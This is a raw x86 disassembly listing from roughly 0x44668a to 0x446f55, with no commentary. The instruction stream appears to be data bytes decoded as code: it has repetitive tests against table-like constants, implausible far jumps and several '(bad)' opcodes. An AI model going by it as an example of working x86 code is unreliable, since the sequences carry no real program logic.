  44668a:	test   al,0xf7
  44668c:	add    edx,DWORD PTR [eax-0x58]
  44668f:	test   DWORD PTR [ebx],0x3f7a828
  446695:	fs test al,0xf7
  446698:	add    esi,DWORD PTR [eax-0x58]
  44669b:	test   DWORD PTR [ebx],0x3f7a87c
  4466a1:	js     0x44664b
  4466a3:	test   DWORD PTR [ebx],0x3f7a884
  4466a9:	mov    ebx,0xa703f7a5
  4466ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4466af:	test   DWORD PTR [ebx],0x3f7a498
  4466b5:	test   BYTE PTR [edi+esi*8-0x841e5fd],ah
  4466bc:	add    ebx,DWORD PTR [esi+edi*4]
  4466bf:	test   DWORD PTR [ebx],0x3f7bac1
  4466c5:	das    
  4466c6:	mov    ebx,0x3f7
  4466cb:	add    BYTE PTR [eax],al
  4466cd:	add    BYTE PTR [edx-0x45],bh
  4466d0:	test   DWORD PTR [ebx],0x3f7bbc8
  4466d6:	mov    sp,0x3f7
  4466da:	cmp    DWORD PTR [eax-0x57c3fc09],0x2293e90e
  4466e4:	sbb    ebp,ecx
  4466e6:	xchg   ebx,eax
  4466e7:	push   cs
  4466e8:	sbb    ebp,ecx
  4466ea:	xchg   ebx,eax
  4466eb:	or     bl,BYTE PTR [ebx]
  4466ed:	jmp    0xe95f5d85
  4466f2:	xchg   ebx,eax
  4466f3:	adc    bl,BYTE PTR [ebx]
  4466f5:	jmp    0xe95f658d
  4466fa:	xchg   ebx,eax
  4466fb:	cli    
  4466fc:	sbb    ch,cl
  4466fe:	xchg   ebx,eax
  4466ff:	ret    0xe918
  446702:	xchg   ebx,eax
  446703:	scas   al,BYTE PTR es:[edi]
  446704:	sbb    cl,ch
  446706:	xchg   ebx,eax
  446707:	push   esp
  446708:	sbb    ecx,ebp
  44670a:	xchg   ebx,eax
  44670b:	jmp    0xe91a:0xf293e91a
  446712:	xchg   ebx,eax
  446713:	pop    esi
  446714:	sbb    ebp,ecx
  446716:	xchg   ebx,eax
  446717:	pop    edx
  446718:	sbb    ebp,ecx
  44671a:	xchg   ebx,eax
  44671b:	inc    esi
  44671c:	sbb    ebp,ecx
  44671e:	xchg   ebx,eax
  44671f:	pushf  
  446720:	sbb    cl,ch
  446722:	xchg   ebx,eax
  446723:	dec    esi
  446724:	sbb    ebp,ecx
  446726:	xchg   ebx,eax
  446727:	and    DWORD PTR [ebx],eax
  446729:	jmp    0xe9452bc1
  44672e:	xchg   ebx,eax
  44672f:	push   edx
  446730:	sbb    ebp,ecx
  446732:	add    BYTE PTR [eax],al
  446734:	add    BYTE PTR [eax],al
  446736:	add    BYTE PTR [ebx-0x6c16e4c2],dl
  44673c:	into   
  44673d:	(bad)  
  44673e:	call   0xe942dfd6
  446743:	xchg   ebx,eax
  446744:	inc    edx
  446745:	sbb    ebp,ecx
  446747:	xchg   ebx,eax
  446748:	cs sbb ebp,ecx
  44674b:	xchg   ebx,eax
  44674c:	sub    bl,BYTE PTR [ebx]
  44674e:	jmp    0xe95ffde6
  446753:	xchg   ebx,eax
  446754:	xor    bl,BYTE PTR [ebx]
  446756:	jmp    0xe96005ee
  44675b:	xchg   ebx,eax
  44675c:	dec    edx
  44675d:	(bad)  
  44675e:	jmp    FWORD PTR [ecx]
  446760:	mov    cl,0xab
  446762:	adc    BYTE PTR [ecx],bh
  446764:	mov    cl,0xec
  446766:	adc    BYTE PTR [ecx],bh
  446768:	mov    cl,0xe1
  44676a:	adc    BYTE PTR [ecx],ch
  44676c:	mov    cl,0x46
  44676e:	or     eax,0xd5ab129
  446773:	stc    
  446774:	mov    al,0xa0
  446776:	psubw  mm6,QWORD PTR [eax-0x4f16f2be]
  44677d:	inc    esi
  44677e:	or     eax,0xd5ab0e9
  446783:	stc    
  446784:	mov    al,0x3e
  446786:	or     eax,0xd52b0f9
  44678b:	jmp    0xe953f040
  446790:	mov    al,0x2a
  446792:	or     eax,0xf80b0b9
  446797:	mov    ecx,0xd32b0
  44679c:	add    BYTE PTR [eax],al
  44679e:	add    BYTE PTR [eax],al
  4467a0:	test   eax,0xa90d26b0
  4467a5:	mov    al,0x7c
  4467a7:	ud1    esi,DWORD PTR [eax-0x4f46f2d2]
  4467ae:	add    cl,BYTE PTR ds:0xd06b0a9
  4467b4:	test   eax,0x790d1ab0
  4467b9:	mov    al,0xfe
  4467bb:	or     al,0x79
  4467bd:	mov    al,0x12
  4467bf:	or     eax,0xd16b069
  4467c4:	imul   esi,DWORD PTR [eax-0x4f86f316],0xb079146b
  4467ce:	loop   0x4467dc
  4467d0:	imul   esi,DWORD PTR [eax-0x4f96f31a],0xb0390cfa
  4467da:	fimul  WORD PTR [eax+edx*4]
  4467dd:	or     DWORD PTR ds:0xd098ce4,ecx
  4467e3:	call   0xdc51716c
  4467e8:	pushf  
  4467e9:	or     DWORD PTR ds:0xd099628,ecx
  4467ef:	sbb    al,0x8e
  4467f1:	or     DWORD PTR ds:0xd098620,ecx
  4467f7:	adc    al,0x9e
  4467f9:	or     DWORD PTR ds:0xd099736,ecx
  4467ff:	cmp    cl,BYTE PTR [edi+0x2e0d09]
  446805:	add    BYTE PTR [eax],al
  446807:	add    BYTE PTR [eax],al
  446809:	xchg   DWORD PTR [ecx],ecx
  44680b:	or     eax,0xd099f32
  446810:	rcl    BYTE PTR [ecx+ecx*1+0x98cb40d],0xd
  446818:	mov    eax,0xac0d0984
  44681d:	pushf  
  44681e:	or     DWORD PTR ds:0xd0994b0,ecx
  446824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446825:	mov    WORD PTR [ecx],cs
  446827:	or     eax,0xd0984a8
  44682c:	pushf  
  44682d:	pushf  
  44682e:	or     DWORD PTR ds:0xd0994b0,ecx
  446834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446835:	mov    WORD PTR [ecx],cs
  446837:	or     eax,0xd0984a8
  44683c:	pushf  
  44683d:	pushf  
  44683e:	or     DWORD PTR ds:0xd0994a0,ecx
  446844:	xchg   esp,eax
  446845:	mov    WORD PTR [ecx],cs
  446847:	or     eax,0xd0986ee
  44684c:	repnz sahf 
  44684e:	or     DWORD PTR ds:0xd097db4,ecx
  446854:	jmp    0xb27d:0xdb0d098e
  44685b:	test   DWORD PTR [ebx],0x3f7a432
  446861:	pop    esi
  446862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446863:	test   DWORD PTR [ebx],0x3f7a45a
  446869:	inc    esi
  44686a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44686b:	test   DWORD PTR [ebx],0x0
  446871:	add    BYTE PTR [edx-0x5c],al
  446874:	test   DWORD PTR [ebx],0x3f7a6b0
  44687a:	les    esp,FWORD PTR [esi-0x5947fc09]
  446880:	test   DWORD PTR [ebx],0x3f7a65c
  446886:	pusha  
  446887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446888:	test   DWORD PTR [ebx],0x3f7a654
  44688e:	dec    eax
  44688f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446890:	test   DWORD PTR [ebx],0x3f7a6ac
  446896:	push   eax
  446897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446898:	test   DWORD PTR [ebx],0x3f7a6a4
  44689e:	cwde   
  44689f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4468a0:	test   DWORD PTR [ebx],0x3f7a67c
  4468a6:	and    BYTE PTR [esi-0x598bfc09],0xf7
  4468ad:	add    ebp,DWORD PTR [eax-0x5a]
  4468b0:	test   DWORD PTR [ebx],0x3f7a68c
  4468b6:	jo     0x44685e
  4468b8:	test   DWORD PTR [ebx],0x3f7a684
  4468be:	js     0x446866
  4468c0:	test   DWORD PTR [ebx],0x3f7be9c
  4468c6:	mov    al,ds:0x9403f7be
  4468cb:	mov    esi,0xbe8803f7
  4468d0:	test   DWORD PTR [ebx],0x3f7be6c
  4468d6:	add    BYTE PTR [eax],al
  4468d8:	add    BYTE PTR [eax],al
  4468da:	add    BYTE PTR [eax-0x6c16f142],dl
  4468e0:	push   es
  4468e1:	adc    eax,0x150a93e9
  4468e6:	jmp    0xe959877e
  4468eb:	xchg   ebx,eax
  4468ec:	add    dl,BYTE PTR ds:0x151693e9
  4468f2:	jmp    0xe959838a
  4468f7:	xchg   ebx,eax
  4468f8:	out    dx,al
  4468f9:	adc    al,0xe9
  4468fb:	xchg   ebx,eax
  4468fc:	adc    dl,BYTE PTR ds:0x14e693e9
  446902:	jmp    0xe959539a
  446907:	xchg   ebx,eax
  446908:	(bad)  
  446909:	adc    al,0xe9
  44690b:	xchg   ebx,eax
  44690c:	loop   0x446922
  44690e:	jmp    0xe9595fa6
  446913:	xchg   ebx,eax
  446914:	cli    
  446915:	adc    al,0xe9
  446917:	xchg   ebx,eax
  446918:	dec    esi
  446919:	adc    eax,0x14f293e9
  44691e:	jmp    0xe959afb6
  446923:	xchg   ebx,eax
  446924:	dec    edx
  446925:	adc    eax,0x155e93e9
  44692a:	jmp    0xe95964c2
  44692f:	xchg   ebx,eax
  446930:	dec    edi
  446931:	adc    eax,0x155a93e9
  446936:	jmp    0xe95997ce
  44693b:	xchg   ebx,eax
  44693c:	push   edx
  44693d:	adc    eax,0xe9
  446942:	add    BYTE PTR [eax],al
  446944:	xchg   ebx,eax
  446945:	cmp    dh,bh
  446947:	call   0xe94428df
  44694c:	xchg   ebx,eax
  44694d:	es (bad) 
  44694f:	call   0xe9598be7
  446954:	xchg   ebx,eax
  446955:	ss adc eax,0x153a93e9
  44695b:	add    BYTE PTR [ecx-0x4b],bh
  44695e:	call   0x690b:0x8eb5790b
  446965:	mov    ch,0x62
  446967:	or     ebp,DWORD PTR [ecx-0x4b]
  44696a:	enter  0x390d,0xb5
  44696e:	in     al,dx
  44696f:	or     eax,0xb5eb539
  446974:	sub    DWORD PTR [ebp-0x4ad6f48e],esi
  44697a:	jbe    0x446987
  44697c:	cmp    DWORD PTR [ebp-0x4ac6f4b6],esi
  446982:	sahf   
  446983:	or     ebp,DWORD PTR [ecx]
  446985:	mov    ch,0xb2
  446987:	or     ebp,DWORD PTR [ecx]
  446989:	mov    ch,0x97
  44698b:	or     al,0xf9
  44698d:	mov    ah,0x6b
  44698f:	or     al,0xf9
  446991:	mov    ah,0x8f
  446993:	or     al,0xe9
  446995:	mov    ah,0x63
  446997:	or     al,0xe9
  446999:	mov    ah,0x86
  44699b:	or     edi,ecx
  44699d:	mov    ah,0x9a
  44699f:	or     edi,ecx
  4469a1:	mov    ah,0x7e
  4469a3:	or     ebp,ecx
  4469a5:	mov    ah,0x92
  4469a7:	or     eax,DWORD PTR [eax]
  4469a9:	add    BYTE PTR [eax],al
  4469ab:	add    BYTE PTR [eax],al
  4469ad:	jmp    0xb9500066
  4469b2:	mov    ah,0x6a
  4469b4:	or     edi,DWORD PTR [ecx-0x56f4714c]
  4469ba:	mov    ah,0x62
  4469bc:	or     ebp,DWORD PTR [ecx-0x46f4994c]
  4469c2:	mov    ah,0x7a
  4469c4:	or     edi,DWORD PTR [ecx-0x56f4d14c]
  4469ca:	mov    ah,0x2
  4469cc:	or     ebp,DWORD PTR [ecx+0x790b06b4]
  4469d2:	mov    ah,0x1a
  4469d4:	or     edi,DWORD PTR [ecx-0x4c]
  4469d7:	dec    BYTE PTR [edx]
  4469d9:	nop
  4469da:	sbb    DWORD PTR ds:0xd198b04,ecx
  4469e0:	or     BYTE PTR [ebx-0x6503f2e7],bl
  4469e6:	sbb    DWORD PTR ds:0xd198b00,ecx
  4469ec:	hlt    
  4469ed:	mov    bl,BYTE PTR [ecx]
  4469ef:	or     eax,0xd199af8
  4469f4:	in     al,dx
  4469f5:	call   0xd19:0x8af00d19
  4469fc:	in     al,0x8a
  4469fe:	sbb    DWORD PTR ds:0xd199ae8,ecx
  446a04:	fcomp  QWORD PTR [edx-0x750ff2e7]
  446a0a:	sbb    DWORD PTR ds:0xd198ae4,ecx
  446a10:	call   0x446a15
  446a15:	add    BYTE PTR [edx-0x6533f2e7],bl
  446a1b:	sbb    DWORD PTR ds:0xd198b4b,ecx
  446a21:	les    ecx,FWORD PTR [edx-0x62d1f2e7]
  446a27:	sbb    DWORD PTR ds:0xd199532,ecx
  446a2d:	ror    BYTE PTR [edx-0x753bf2e7],1
  446a33:	sbb    DWORD PTR ds:0xd199ac8,ecx
  446a39:	lods   al,BYTE PTR ds:[esi]
  446a3a:	call   0xd19:0x8b2b0d19
  446a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446a42:	mov    bl,BYTE PTR [ecx]
  446a44:	or     eax,0xd198168
  446a49:	pushf  
  446a4a:	call   0xd19:0x8aa00d19
  446a51:	xchg   esp,eax
  446a52:	mov    bl,BYTE PTR [ecx]
  446a54:	or     eax,0xf7b29a98
  446a59:	add    edx,DWORD PTR [esp+edi*4]
  446a5c:	test   DWORD PTR [ebx],0x3f7bc20
  446a62:	or     al,0xbc
  446a64:	test   DWORD PTR [ebx],0x3f7bc18
  446a6a:	in     al,0xbc
  446a6c:	test   DWORD PTR [ebx],0x3f7bc10
  446a72:	or     al,0xbc
  446a74:	test   DWORD PTR [ebx],0x3f7c034
  446a7a:	add    BYTE PTR [eax],al
  446a7c:	add    BYTE PTR [eax],al
  446a7e:	add    BYTE PTR [esp+edi*4-0x433ffc09],dh
  446a85:	test   DWORD PTR [ebx],0x3f7bcac
  446a8b:	mov    eax,0xc403f7bc
  446a90:	mov    esp,0xbcb003f7
  446a95:	test   DWORD PTR [ebx],0x3f7bcbc
  446a9b:	push   0x5403f7bc
  446aa0:	mov    esp,0xbc6003f7
  446aa5:	test   DWORD PTR [ebx],0x3f7bc4c
  446aab:	pop    eax
  446aac:	mov    esp,0xbfc903f7
  446ab1:	test   DWORD PTR [ebx],0x3f7bc40
  446ab7:	dec    esp
  446ab8:	mov    esp,0xbc5803f7
  446abd:	test   DWORD PTR [ebx],0x3f7bc84
  446ac3:	push   eax
  446ac4:	mov    esp,0xbc7c03f7
  446ac9:	test   DWORD PTR [ebx],0x3f7bc68
  446acf:	je     0x446a8d
  446ad1:	test   DWORD PTR [ebx],0xe90ebc70
  446ad7:	xchg   ebx,eax
  446ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446ad9:	adc    al,0xe9
  446adb:	xchg   ebx,eax
  446adc:	stos   BYTE PTR es:[edi],al
  446add:	adc    al,0xe9
  446adf:	xchg   ebx,eax
  446ae0:	mov    esi,0xe914
  446ae5:	add    BYTE PTR [eax],al
  446ae7:	add    BYTE PTR [ebx-0x6c16eb5e],dl
  446aed:	mov    dh,0x14
  446aef:	jmp    0xe959c687
  446af4:	xchg   ebx,eax
  446af5:	push   cs
  446af6:	pop    ss
  446af7:	jmp    0xe9591d8f
  446afc:	xchg   ebx,eax
  446afd:	push   es
  446afe:	pop    ss
  446aff:	jmp    0xe95b7597
  446b04:	xchg   ebx,eax
  446b05:	push   ds
  446b06:	pop    ss
  446b07:	jmp    0xe95b6d9f
  446b0c:	xchg   ebx,eax
  446b0d:	push   ss
  446b0e:	pop    ss
  446b0f:	jmp    0xe95b85a7
  446b14:	xchg   ebx,eax
  446b15:	out    dx,al
  446b16:	push   ss
  446b17:	jmp    0xe95b7daf
  446b1c:	xchg   ebx,eax
  446b1d:	out    0x16,al
  446b1f:	jmp    0xe95b55b7
  446b24:	xchg   ebx,eax
  446b25:	(bad)  
  446b26:	push   ss
  446b27:	jmp    0xe95b4dbf
  446b2c:	xchg   ebx,eax
  446b2d:	not    BYTE PTR [esi]
  446b2f:	jmp    0xe95a06c7
  446b34:	xchg   ebx,eax
  446b35:	dec    esi
  446b36:	pop    ss
  446b37:	jmp    0xe95b5dcf
  446b3c:	xchg   ebx,eax
  446b3d:	inc    esi
  446b3e:	pop    ss
  446b3f:	jmp    0xe95bb5d7
  446b44:	xchg   ebx,eax
  446b45:	pop    esi
  446b46:	pop    ss
  446b47:	jmp    0xe95baddf
  446b4c:	add    BYTE PTR [eax],al
  446b4e:	add    BYTE PTR [eax],al
  446b50:	add    BYTE PTR [ebx-0x6c16e8aa],dl
  446b56:	pop    edx
  446b57:	pop    ss
  446b58:	add    BYTE PTR [ecx-0x56f6754f],bh
  446b5e:	mov    cl,0xe2
  446b60:	or     ebp,DWORD PTR [ecx+0x790982b1]
  446b66:	mov    cl,0x86
  446b68:	or     DWORD PTR [ecx-0x4f],edi
  446b6b:	call   0x6909:0x7eb16909
  446b72:	mov    cl,0x92
  446b74:	or     DWORD PTR [ecx-0x4f],edi
  446b77:	xchg   esi,eax
  446b78:	or     DWORD PTR [ecx-0x4f],edi
  446b7b:	push   0x9
  446b7d:	imul   esi,DWORD PTR [ecx-0x4e96f672],0xb1390962
  446b87:	or     WORD PTR [ecx],di
  446b8a:	mov    cl,0x7a
  446b8c:	or     DWORD PTR [ecx],ebp
  446b8e:	mov    cl,0x5e
  446b90:	or     DWORD PTR [ecx],ebp
  446b92:	mov    cl,0x72
  446b94:	or     DWORD PTR [ecx],edi
  446b96:	mov    cl,0x76
  446b98:	or     DWORD PTR [ecx],edi
  446b9a:	mov    cl,0xbc
  446b9c:	or     ebp,DWORD PTR [ecx]
  446b9e:	mov    cl,0x6e
  446ba0:	or     DWORD PTR [ecx],ebp
  446ba2:	mov    cl,0x42
  446ba4:	or     ecx,edi
  446ba6:	mov    al,0x46
  446ba8:	or     ecx,edi
  446baa:	mov    al,0x5a
  446bac:	or     ecx,ebp
  446bae:	mov    al,0x3e
  446bb0:	or     ecx,ebp
  446bb2:	mov    al,0x52
  446bb4:	or     DWORD PTR [eax],eax
  446bb6:	add    BYTE PTR [eax],al
  446bb8:	add    BYTE PTR [eax],al
  446bba:	stc    
  446bbb:	mov    al,0x56
  446bbd:	or     ecx,edi
  446bbf:	mov    al,0x2a
  446bc1:	or     ecx,ebp
  446bc3:	mov    al,0x4e
  446bc5:	or     ecx,ebp
  446bc7:	mov    al,0x22
  446bc9:	or     DWORD PTR [ecx-0x46f6d950],edi
  446bcf:	mov    al,0x3a
  446bd1:	or     DWORD PTR [ecx-0x6ff47f50],ebp
  446bd7:	sbb    ecx,DWORD PTR ds:0xd1b9b9a
  446bdd:	mov    ds,WORD PTR [ebx-0x746df2e5]
  446be3:	sbb    ecx,DWORD PTR ds:0xd1b8939
  446be9:	mov    bl,BYTE PTR [ebx-0x6481f2e7]
  446bef:	sbb    DWORD PTR ds:0xd198b82,ecx
  446bf5:	sub    DWORD PTR [ecx-0x66e2f2e7],ecx
  446bfb:	sbb    DWORD PTR ds:0xd199b6e,ecx
  446c01:	adc    eax,0x660d1989
  446c06:	mov    ebx,DWORD PTR [ecx]
  446c08:	or     eax,0xd199b6a
  446c0d:	pop    esi
  446c0e:	fwait
  446c0f:	sbb    DWORD PTR ds:0xd198b62,ecx
  446c15:	lock mov BYTE PTR [ecx],bl
  446c18:	or     eax,0xd1998e4
  446c1d:	call   0x446c22
  446c22:	add    BYTE PTR [eax-0x74adf2e7],bl
  446c28:	sbb    DWORD PTR ds:0xd1988f9,ecx
  446c2e:	in     eax,dx
  446c2f:	cwde   
  446c30:	sbb    DWORD PTR ds:0xd1998f1,ecx
  446c36:	in     eax,0x88
  446c38:	sbb    DWORD PTR ds:0xd1988e9,ecx
  446c3e:	fstp   QWORD PTR [eax-0x64d1f2e7]
  446c44:	sbb    DWORD PTR ds:0xd198b32,ecx
  446c4a:	(bad)  [eax-0x6732f2e7]
  446c50:	sbb    DWORD PTR ds:0xf7b298d1,ecx
  446c56:	add    edx,ebp
  446c58:	mov    edx,0xb79e03f7
  446c5d:	test   DWORD PTR [ebx],0x3f7b78a
  446c63:	xchg   esi,eax
  446c64:	mov    bh,0xf7
  446c66:	add    eax,DWORD PTR [edx-0x26fc0849]
  446c6c:	mov    edx,0xba3d03f7
  446c71:	test   DWORD PTR [ebx],0x3f7ba41
  446c77:	xor    eax,0x2903f7ba
  446c7c:	mov    edx,0xba0d03f7
  446c81:	test   DWORD PTR [ebx],0x3f7b876
  446c87:	add    BYTE PTR [eax],al
  446c89:	add    BYTE PTR [eax],al
  446c8b:	add    BYTE PTR ds:0xf903f7ba,al
  446c91:	mov    ecx,0xba1d03f7
  446c96:	test   DWORD PTR [ebx],0x3f7ba21
  446c9c:	adc    eax,0x903f7ba
  446ca1:	mov    edx,0xbaad03f7
  446ca6:	test   DWORD PTR [ebx],0x3f7ba11
  446cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446cad:	mov    edx,0xba9903f7
  446cb2:	test   DWORD PTR [ebx],0x3f7ba7d
  446cb8:	inc    esi
  446cb9:	mov    eax,0xb7d203f7
  446cbe:	test   DWORD PTR [ebx],0x3f7b83e
  446cc4:	sub    bh,BYTE PTR [eax-0x47c9fc09]
  446cca:	test   DWORD PTR [ebx],0x3f7b822
  446cd0:	cs mov eax,0x5893e90e
  446cd6:	adc    al,0xe9
  446cd8:	xchg   ebx,eax
  446cd9:	sub    al,0x14
  446cdb:	jmp    0xe958bd73
  446ce0:	xchg   ebx,eax
  446ce1:	and    al,0x14
  446ce3:	jmp    0xe958957b
  446ce8:	xchg   ebx,eax
  446ce9:	cmp    al,0x14
  446ceb:	jmp    0xe9588d83
  446cf0:	add    BYTE PTR [eax],al
  446cf2:	add    BYTE PTR [eax],al
  446cf4:	add    BYTE PTR [ebx-0x6c16ebcc],dl
  446cfa:	cmp    al,0x14
  446cfc:	jmp    0xe958f594
  446d01:	xchg   ebx,eax
  446d02:	xor    al,0x14
  446d04:	jmp    0xe958ed9c
  446d09:	xchg   ebx,eax
  446d0a:	mov    WORD PTR [ecx+ebp*8],ss
  446d0d:	xchg   ebx,eax
  446d0e:	cwde   
  446d0f:	adc    al,0xe9
  446d11:	xchg   ebx,eax
  446d12:	test   BYTE PTR [ecx+ebp*8],dl
  446d15:	xchg   ebx,eax
  446d16:	nop
  446d17:	adc    al,0xe9
  446d19:	xchg   ebx,eax
  446d1a:	pushf  
  446d1b:	adc    al,0xe9
  446d1d:	xchg   ebx,eax
  446d1e:	push   0x9493e914
  446d23:	adc    al,0xe9
  446d25:	xchg   ebx,eax
  446d26:	pusha  
  446d27:	adc    al,0xe9
  446d29:	xchg   ebx,eax
  446d2a:	ins    BYTE PTR es:[edi],dx
  446d2b:	adc    al,0xe9
  446d2d:	xchg   ebx,eax
  446d2e:	js     0x446d44
  446d30:	jmp    0xe958d1c8
  446d35:	xchg   ebx,eax
  446d36:	jo     0x446d4c
  446d38:	jmp    0xe958e9d0
  446d3d:	xchg   ebx,eax
  446d3e:	enter  0xe914,0x93
  446d42:	je     0x446d58
  446d44:	jmp    0xe9592ddc
  446d49:	xchg   ebx,eax
  446d4a:	int3   
  446d4b:	adc    al,0xe9
  446d4d:	xchg   ebx,eax
  446d4e:	fcom   DWORD PTR [eax+eax*1]
  446d51:	jmp    0xe94e8a0b
  446d56:	mov    ch,0x30
  446d58:	or     al,BYTE PTR [eax]
  446d5a:	add    BYTE PTR [eax],al
  446d5c:	add    BYTE PTR [eax],al
  446d5e:	mov    ecx,0xb90a34b5
  446d63:	mov    ch,0x8
  446d65:	or     ch,BYTE PTR [ecx-0x56f5d34b]
  446d6b:	mov    ch,0x0
  446d6d:	or     bh,BYTE PTR [ecx-0x46f5fb4b]
  446d73:	mov    ch,0x18
  446d75:	or     ch,BYTE PTR [ecx-0x56f6034b]
  446d7b:	mov    ch,0x10
  446d7d:	or     bh,BYTE PTR [ecx-0x4b]
  446d80:	adc    al,0xa
  446d82:	jns    0x446d39
  446d84:	call   0xcf9d692
  446d89:	or     ch,BYTE PTR [ecx-0x4b]
  446d8c:	loopne 0x446d97
  446d8e:	jns    0x446d45
  446d90:	in     al,0x9
  446d92:	jns    0x446d49
  446d94:	clc    
  446d95:	or     DWORD PTR [ecx-0x4b],ebp
  446d98:	fmul   QWORD PTR [ecx]
  446d9a:	imul   esi,DWORD PTR [ebp-0x4ac6f610],0xb53909f4
  446da4:	enter  0x2909,0xb5
  446da8:	in     al,dx
  446da9:	or     DWORD PTR [ecx],ebp
  446dab:	mov    ch,0xc0
  446dad:	or     DWORD PTR [ecx],edi
  446daf:	mov    ch,0xc4
  446db1:	or     DWORD PTR [ecx],edi
  446db3:	mov    ch,0xd8
  446db5:	or     DWORD PTR [ecx],ebp
  446db7:	mov    ch,0xbc
  446db9:	or     DWORD PTR [ecx],ebp
  446dbb:	mov    ch,0xd0
  446dbd:	or     ecx,edi
  446dbf:	mov    ah,0xd4
  446dc1:	or     DWORD PTR [eax],eax
  446dc3:	add    BYTE PTR [eax],al
  446dc5:	add    BYTE PTR [eax],al
  446dc7:	stc    
  446dc8:	mov    ah,0xa8
  446dca:	or     ecx,ebp
  446dcc:	mov    ah,0xcc
  446dce:	or     ecx,ebp
  446dd0:	mov    ah,0xa0
  446dd2:	or     DWORD PTR [eax-0x6645f2e5],edx
  446dd8:	sbb    ecx,DWORD PTR ds:0xd1b89ae
  446dde:	mov    dl,0x89
  446de0:	sbb    ecx,DWORD PTR ds:0xd1b99a6
  446de6:	stos   BYTE PTR es:[edi],al
  446de7:	cdq    
  446de8:	sbb    ecx,DWORD PTR ds:0xd1b899e
  446dee:	mov    ds:0x960d1b89,al
  446df3:	cdq    
  446df4:	sbb    ecx,DWORD PTR ds:0xd1b999a
  446dfa:	mov    cs,WORD PTR [ecx-0x766df2e5]
  446e00:	sbb    ecx,DWORD PTR ds:0xd199986
  446e06:	mov    bl,BYTE PTR [ecx-0x7681f2e7]
  446e0c:	sbb    DWORD PTR ds:0xd198982,ecx
  446e12:	jbe    0x446dad
  446e14:	sbb    DWORD PTR ds:0xd19997a,ecx
  446e1a:	outs   dx,BYTE PTR ds:[esi]
  446e1b:	mov    DWORD PTR [ecx],ebx
  446e1d:	or     eax,0xd198972
  446e22:	cwd    
  446e24:	sbb    DWORD PTR ds:0xd19996a,ecx
  446e2a:	pop    esi
  446e2b:	add    BYTE PTR [eax],al
  446e2d:	add    BYTE PTR [eax],al
  446e2f:	add    BYTE PTR [ecx-0x769df2e7],cl
  446e35:	sbb    DWORD PTR ds:0xd199956,ecx
  446e3b:	pop    edx
  446e3c:	cdq    
  446e3d:	sbb    DWORD PTR ds:0xd19894e,ecx
  446e43:	push   edx
  446e44:	mov    DWORD PTR [ecx],ebx
  446e46:	or     eax,0xd199946
  446e4b:	dec    edx
  446e4c:	cdq    
  446e4d:	sbb    DWORD PTR ds:0xf7b2893e,ecx
  446e53:	add    edx,DWORD PTR [edx-0x47]
  446e56:	test   DWORD PTR [ebx],0x3f7b9a6
  446e5c:	stos   BYTE PTR es:[edi],al
  446e5d:	mov    ecx,0xb9ae03f7
  446e62:	test   DWORD PTR [ebx],0x3f7b9a2
  446e68:	jbe    0x446e23
  446e6a:	test   DWORD PTR [ebx],0x3f7b97a
  446e70:	sahf   
  446e71:	mov    ecx,0xb97203f7
  446e76:	test   DWORD PTR [ebx],0x3f7b986
  446e7c:	mov    bh,BYTE PTR [ecx-0x4671fc09]
  446e82:	test   DWORD PTR [ebx],0x3f7b982
  446e88:	xchg   esi,eax
  446e89:	mov    ecx,0xb99a03f7
  446e8e:	test   DWORD PTR [ebx],0x3f7ba7e
  446e94:	add    BYTE PTR [eax],al
  446e96:	add    BYTE PTR [eax],al
  446e98:	add    BYTE PTR [edx+0x6603f7b9],dl
  446e9e:	mov    edx,0xba6a03f7
  446ea3:	test   DWORD PTR [ebx],0x3f7ba6e
  446ea9:	bound  edi,QWORD PTR [edx-0x45c9fc09]
  446eaf:	test   DWORD PTR [ebx],0x3f7ba3a
  446eb5:	pop    esi
  446eb6:	mov    edx,0xba3203f7
  446ebb:	test   DWORD PTR [ebx],0x3f7ba46
  446ec1:	dec    edx
  446ec2:	mov    edx,0xba4e03f7
  446ec7:	test   DWORD PTR [ebx],0x3f7ba42
  446ecd:	(bad)  
  446ece:	mov    ecx,0xfc93e90e
  446ed3:	adc    eax,0x164893e9
  446ed8:	jmp    0xe95a6370
  446edd:	xchg   ebx,eax
  446ede:	inc    eax
  446edf:	push   ss
  446ee0:	jmp    0xe95abb78
  446ee5:	xchg   ebx,eax
  446ee6:	pop    eax
  446ee7:	push   ss
  446ee8:	jmp    0xe95ab380
  446eed:	xchg   ebx,eax
  446eee:	push   eax
  446eef:	push   ss
  446ef0:	jmp    0xe95acb88
  446ef5:	xchg   ebx,eax
  446ef6:	sub    BYTE PTR [esi],dl
  446ef8:	jmp    0xe95ac390
  446efd:	add    BYTE PTR [eax],al
  446eff:	add    BYTE PTR [eax],al
  446f01:	add    BYTE PTR [ebx-0x6c16e9e0],dl
  446f07:	sub    al,0x16
  446f09:	jmp    0xe95aa7a1
  446f0e:	xchg   ebx,eax
  446f0f:	and    al,0x16
  446f11:	jmp    0xe95a9ba9
  446f16:	xchg   ebx,eax
  446f17:	cmp    BYTE PTR [esi],dl
  446f19:	jmp    0xe95af3b1
  446f1e:	xchg   ebx,eax
  446f1f:	xor    BYTE PTR [esi],dl
  446f21:	jmp    0xe95aebb9
  446f26:	xchg   ebx,eax
  446f27:	mov    BYTE PTR [esi],dl
  446f29:	jmp    0xe95b03c1
  446f2e:	xchg   ebx,eax
  446f2f:	adc    BYTE PTR [esi],0xe9
  446f32:	xchg   ebx,eax
  446f33:	mov    WORD PTR [esi],ss
  446f35:	jmp    0xe95b07cd
  446f3a:	xchg   ebx,eax
  446f3b:	fs push ss
  446f3d:	jmp    0xe95affd5
  446f42:	xchg   ebx,eax
  446f43:	pop    esp
  446f44:	push   ss
  446f45:	jmp    0xe95ad7dd
  446f4a:	xchg   ebx,eax
  446f4b:	je     0x446f63
  446f4d:	add    BYTE PTR [ecx],ch
  446f4f:	mov    dl,0x3c
  446f51:	or     cl,bh
  446f53:	mov    cl,0x50
  446f55:	or     cl,bh
